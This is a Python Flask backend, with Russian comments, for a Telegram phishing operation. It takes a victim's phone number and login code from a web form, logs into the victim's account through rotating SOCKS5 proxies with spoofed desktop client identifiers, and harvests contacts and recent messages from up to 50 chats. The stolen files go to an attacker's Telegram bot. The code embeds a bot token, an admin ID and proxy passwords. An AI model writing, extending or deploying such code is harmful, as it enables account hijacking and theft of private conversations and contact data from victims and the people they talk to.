from flask import Flask, request, jsonify, send_from_directory
import json
import os
import asyncio
import threading
import random
import requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty

# ===== ГЕНЕРАТОР API-КЛЮЧЕЙ =====
try:
    from opentele.api import API
    def generate_api(uid):
        return API.TelegramDesktop.Generate(system="windows", unique_id=uid)
except ImportError:
    # fallback, если opentele не установлен
    class FakeAPI:
        def __init__(self):
            self.api_id = 2040
            self.api_hash = 'b18441a1ff607e10aed891d4f5a9b7a5'
            self.device_model = 'Desktop'
            self.system_version = 'Windows 10'
            self.app_version = '4.16.5 x64'
            self.lang_code = 'en'
            self.system_lang_code = 'en-US'
    def generate_api(uid):
        return FakeAPI()

app = Flask(__name__)

os.makedirs('logs', exist_ok=True)
os.makedirs('sessions', exist_ok=True)

# ===== НАСТРОЙКИ TELEGRAM БОТА =====
BOT_TOKEN = '8721886899:AAGu9u-1909paDVbxUYXza_e-yVhQamL6Ts'  # ЗАМЕНИ НА СВОЙ
ADMIN_ID = 8576352504  # ЗАМЕНИ НА СВОЙ TELEGRAM ID

def send_to_telegram(text, file_path=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    if file_path:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': ADMIN_ID, 'caption': text[:1000] if text else ''}
            requests.post(url + 'sendDocument', files=files, data=data)
    else:
        requests.post(url + 'sendMessage', json={'chat_id': ADMIN_ID, 'text': text[:4000]})

# ===== ПРОКСИ =====
PROXY_LIST = [
    {"addr": "31.59.20.176", "port": 6754, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "31.56.127.193", "port": 7684, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "45.38.107.97", "port": 6014, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "198.105.121.200", "port": 6462, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "64.137.96.74", "port": 6641, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "198.23.243.226", "port": 6361, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "38.154.185.97", "port": 6370, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "84.247.60.125", "port": 6095, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "142.111.67.146", "port": 5611, "username": "hglsvxwl", "password": "lbix289l7ppz"},
    {"addr": "191.96.254.138", "port": 6185, "username": "hglsvxwl", "password": "lbix289l7ppz"},
]

def get_random_proxy():
    p = random.choice(PROXY_LIST)
    return {'proxy_type': 'socks5', 'addr': p['addr'], 'port': p['port'], 'username': p['username'], 'password': p['password'], 'rdns': True}

# ===== ПАРСЕР =====
def run_parser(phone, code, password):
    def _run():
        asyncio.set_event_loop(asyncio.new_event_loop())
        loop = asyncio.get_event_loop()
        loop.run_until_complete(parse_task(phone, code, password))
    threading.Thread(target=_run, daemon=True).start()

async def parse_task(phone, code, password):
    # Генерируем API-ключи автоматически
    api = generate_api(abs(hash(phone)) % 1000000)
    proxy = get_random_proxy()
    
    client = TelegramClient(
        f'sessions/{phone}',
        api.api_id,
        api.api_hash,
        device_model=api.device_model,
        system_version=api.system_version,
        app_version=api.app_version,
        lang_code=api.lang_code,
        system_lang_code=api.system_lang_code,
        proxy=proxy
    )
    
    try:
        await client.start(phone=phone, code=code)
        if password:
            try: await client.sign_in(password=password)
            except: pass
        
        me = await client.get_me()
        
        # ===== КОНТАКТЫ =====
        contacts = await client(GetContactsRequest(hash=0))
        contact_list = []
        for u in contacts.users:
            contact_list.append({
                'id': u.id,
                'first_name': u.first_name,
                'last_name': u.last_name,
                'username': u.username,
                'phone': u.phone
            })
        
        contacts_txt = f"📱 КОНТАКТЫ ({len(contact_list)})\n\n"
        for c in contact_list:
            contacts_txt += f"👤 {c['first_name']} {c.get('last_name', '')}\n"
            if c.get('username'): contacts_txt += f"   @{c['username']}\n"
            if c.get('phone'): contacts_txt += f"   📞 {c['phone']}\n"
            contacts_txt += f"   🆔 {c['id']}\n\n"
        
        contacts_file = f'logs/contacts_{phone}.txt'
        with open(contacts_file, 'w', encoding='utf-8') as f:
            f.write(contacts_txt)
        
        send_to_telegram(f"📱 Контакты {me.first_name}: {len(contact_list)}", contacts_file)
        
        # ===== ДИАЛОГИ =====
        dialogs = await client(GetDialogsRequest(
            offset_date=None, offset_id=0, offset_peer=InputPeerEmpty(), limit=50, hash=0
        ))
        
        html_content = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Диалоги {me.first_name}</title>
<style>
body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0f0f1a;color:#e0e0e0;padding:20px;max-width:800px;margin:0 auto}}
.dialog{{background:rgba(255,255,255,0.04);border-radius:12px;padding:16px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.06)}}
.dialog h3{{margin:0;font-size:16px;font-weight:600;color:#fff}}
.dialog .info{{color:#94a3b8;font-size:13px;margin:4px 0}}
.dialog .type{{display:inline-block;background:rgba(50,150,255,0.15);color:#5b8cff;font-size:11px;padding:2px 10px;border-radius:100px;font-weight:500}}
.messages{{margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,0.06)}}
.msg{{background:rgba(255,255,255,0.03);border-radius:8px;padding:8px 12px;margin-bottom:6px;font-size:14px}}
.msg .sender{{color:#5b8cff;font-weight:500}}
.msg .text{{color:#e0e0e0}}
.msg .date{{color:#64748b;font-size:11px;float:right}}
</style>
</head>
<body>
    <h1>💬 Диалоги {me.first_name}</h1>
    <p style="color:#94a3b8;margin-bottom:20px">Всего: {len(dialogs.dialogs)}</p>
'''
        
        for dialog in dialogs.dialogs:
            dialog_type = '👤 Пользователь'
            if dialog.is_group: dialog_type = '👥 Группа'
            if dialog.is_channel: dialog_type = '📢 Канал'
            
            html_content += f'''
    <div class="dialog">
        <h3>{dialog.name or 'Без названия'}</h3>
        <div class="info"><span class="type">{dialog_type}</span> 🆔 {dialog.id}</div>
        <div class="messages">'''
            try:
                messages = await client.get_messages(dialog.id, limit=10)
                for msg in messages:
                    sender = "Я" if msg.out else (msg.sender.first_name if msg.sender else "Неизвестно")
                    text = msg.text.replace('<', '&lt;').replace('>', '&gt;') if msg.text else '[Медиа]'
                    date = msg.date.strftime('%H:%M') if msg.date else ''
                    html_content += f'''
            <div class="msg"><span class="sender">{sender}</span><span class="date">{date}</span><div class="text">{text[:200]}</div></div>'''
            except: pass
            html_content += '''
        </div>
    </div>'''
        
        html_content += '''
</body>
</html>'''
        
        html_file = f'logs/dialogs_{phone}.html'
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        send_to_telegram(f"💬 Диалоги {me.first_name}: {len(dialogs.dialogs)}", html_file)
        
        print(f"[+] Парсинг {phone}: {len(contact_list)} контактов, {len(dialogs.dialogs)} диалогов")
        
    except Exception as e:
        print(f"[-] Ошибка {phone}: {e}")
        send_to_telegram(f"❌ Ошибка парсинга {phone}: {str(e)}")
    finally:
        await client.disconnect()

# ===== ОТПРАВКА КОДА (РЕАЛЬНАЯ) =====
@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone')
    if not phone:
        return jsonify({'status': 'error', 'message': 'Номер не указан'}), 400
    
    print(f"[+] Запрос кода для {phone}")
    
    try:
        # Генерируем API для отправки кода
        api = generate_api(abs(hash(phone)) % 1000000)
        client = TelegramClient(f'sessions/code_{phone}', api.api_id, api.api_hash)
        client.connect()
        result = client.send_code_request(phone)
        client.disconnect()
        
        with open(f'sessions/{phone}_hash.txt', 'w') as f:
            f.write(result.phone_code_hash)
        
        print(f"[+] Код отправлен на {phone}")
        return jsonify({'status': 'ok', 'message': 'Код отправлен'})
    except Exception as e:
        print(f"[-] Ошибка отправки кода: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/')
def index():
    return send_from_directory('templates', 'index.html')

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.get_json()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    filename = f'logs/{timestamp}.json'
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    print(f"[+] {data.get('type')}: {filename}")
    
    if data.get('type') == 'code':
        phone = data.get('user', {}).get('phone')
        pin = data.get('data', {}).get('pin', '')
        if phone and pin:
            print(f"[+] Вход в аккаунт {phone}")
            run_parser(phone, pin, '')
    
    return jsonify({'status': 'ok'})

@app.route('/api/parse', methods=['POST'])
def parse():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password', '')
    if phone and code:
        run_parser(phone, code, password)
        return jsonify({'status': 'parsing_started'})
    return jsonify({'error': 'missing data'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)